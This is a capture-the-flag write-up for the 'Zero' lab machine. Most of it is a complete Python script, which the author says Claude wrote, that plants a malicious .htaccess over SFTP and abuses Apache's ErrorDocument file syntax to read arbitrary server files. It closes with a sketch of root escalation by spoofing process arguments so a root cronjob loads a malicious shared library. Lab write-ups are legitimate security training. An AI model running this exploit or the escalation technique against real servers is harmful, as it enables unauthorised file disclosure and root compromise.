Zero is an Insane difficulty Linux machine that features a web application that allows for the creation of credentials to be used on an SFTP server where users can create their own HTML pages. This service is exploitable by uploading a malicious .htaccess file to gain arbitrary file read access to the web servers' asset files. By viewing the source code of these files players will find hard coded credentials that allow for access to the target over SSH. The Apache server configuration is periodically managed by a cronjob that checks the integrity of the Apache configurations and can be abused by satisfying the conditions of the cronjob task to include a malicious line into the restored configuration to leak the contents of files owned by root.

This box is from Vulnlab but played on Hackthebox.

#### File read script

I made claude write me a script. 

```terminal
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "paramiko",
#     "requests",
# ]
# ///
"""
htaccess_leak.py — arbitrary file read via a crafted .htaccess ErrorDocument

Technique:
    Apache's mod_file (via ErrorDocument's %{file:...} syntax) can be abused
    to dump the contents of a local file into the body of an error response.
    If we have SFTP write access to a user's public_html directory, we can
    drop a .htaccess that rewrites the 404 handler to leak an arbitrary file,
    then trigger a 404 over HTTP and read the response body.

Usage:
    python htaccess_leak.py --host <ip> --user <sftp_user> --pass <sftp_pass> \
        --file </path/to/read> [--port 22] [--web-port 80] [--https] [--keep]

Example (HTB "zero"):
    python htaccess_leak.py --host 10.129.234.62 --user zro-2f4e0541 \
        --pass 8c07ca60 --file /etc/passwd
"""

import argparse
import sys
from pathlib import PurePosixPath

import paramiko
import requests


HTACCESS_PATH = "public_html/.htaccess"
TRIGGER_FILENAME = "trigger-404"  # any path that doesn't exist under public_html


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Leak an arbitrary file via a malicious .htaccess ErrorDocument directive."
    )
    p.add_argument("--host", required=True, help="target IP or hostname")
    p.add_argument("--user", required=True, help="SFTP username")
    p.add_argument("--pass", dest="password", required=True, help="SFTP password")
    p.add_argument("--file", required=True, help="absolute path on target to read")
    p.add_argument("--port", type=int, default=22, help="SSH/SFTP port (default: 22)")
    p.add_argument("--web-port", type=int, default=80, help="HTTP(S) port (default: 80)")
    p.add_argument("--https", action="store_true", help="use https:// instead of http://")
    p.add_argument(
        "--keep",
        action="store_true",
        help="leave the malicious .htaccess in place instead of restoring the original",
    )
    return p.parse_args()


def connect_sftp(host: str, port: int, user: str, password: str) -> tuple[paramiko.SSHClient, paramiko.SFTPClient]:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=host, port=port, username=user, password=password)
    return ssh, ssh.open_sftp()


def backup_existing_htaccess(sftp: paramiko.SFTPClient) -> bytes | None:
    """Return the current .htaccess content if one exists, else None."""
    try:
        with sftp.file(HTACCESS_PATH, "rb") as f:
            return f.read()
    except FileNotFoundError:
        return None


def deploy_payload(sftp: paramiko.SFTPClient, leak_target: str) -> None:
    payload = f"ErrorDocument 404 %{{file:{leak_target}}}\n".encode()
    with sftp.file(HTACCESS_PATH, "wb") as f:
        f.write(payload)


def restore_htaccess(sftp: paramiko.SFTPClient, original: bytes | None) -> None:
    if original is None:
        sftp.remove(HTACCESS_PATH)
    else:
        with sftp.file(HTACCESS_PATH, "wb") as f:
            f.write(original)


def trigger_leak(host: str, web_port: int, user: str, https: bool) -> str:
    scheme = "https" if https else "http"
    default_port = 443 if https else 80
    netloc = host if web_port == default_port else f"{host}:{web_port}"
    url = f"{scheme}://{netloc}/~{user}/{TRIGGER_FILENAME}"

    resp = requests.get(url, verify=False, timeout=10)
    if resp.status_code != 404:
        print(
            f"[!] expected HTTP 404 from the trigger request, got {resp.status_code}. "
            "Payload may not have applied; check public_html path / AllowOverride settings.",
            file=sys.stderr,
        )
    return resp.text


def main() -> None:
    args = parse_args()
    leak_target = str(PurePosixPath(args.file))

    print(f"[*] connecting to {args.user}@{args.host}:{args.port} over SFTP")
    ssh, sftp = connect_sftp(args.host, args.port, args.user, args.password)

    try:
        original = backup_existing_htaccess(sftp)
        print(f"[*] writing malicious {HTACCESS_PATH} -> leaking {leak_target}")
        deploy_payload(sftp, leak_target)

        print(f"[*] triggering 404 over HTTP to read file contents")
        body = trigger_leak(args.host, args.web_port, args.user, args.https)

        print(f"\n----- contents of {leak_target} -----")
        print(body)
        print("----- end -----\n")

        if not args.keep:
            print(f"[*] restoring original {HTACCESS_PATH}")
            restore_htaccess(sftp, original)
        else:
            print(f"[*] --keep set, leaving payload in place")
    finally:
        sftp.close()
        ssh.close()


if __name__ == "__main__":
    main()
```

zro.web-confcheck finds the running Apache process for this vhost via pgrep, swaps apache2 for apache2ctl in its command line, and runs it with -t to test the config — but it does this by unquoted shell expansion of attacker-visible process data rather than a hardcoded command.

apache2ctl -t loads every module referenced in the config its pointed at, so controlling the fake processs args as an unprivileged user lets you get a malicious .so constructor executed as root.
